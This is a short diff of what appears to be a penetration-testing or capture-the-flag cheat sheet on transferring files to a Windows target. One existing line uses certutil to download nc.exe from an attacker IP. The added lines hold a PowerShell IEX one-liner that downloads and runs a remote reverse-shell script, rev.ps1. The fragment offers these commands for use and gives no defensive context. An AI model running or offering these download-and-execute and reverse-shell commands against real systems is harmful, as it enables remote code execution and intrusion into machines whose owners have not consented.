@@ -17,6 +17,11 @@ o con
 certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
 ```
 
+o con:
+```
+IEX(New-Object Net.WebCLient).DownloadString('http://10.10.14.19:9000/rev.ps1')
+```
+
 ### FTP
 host:
 ```
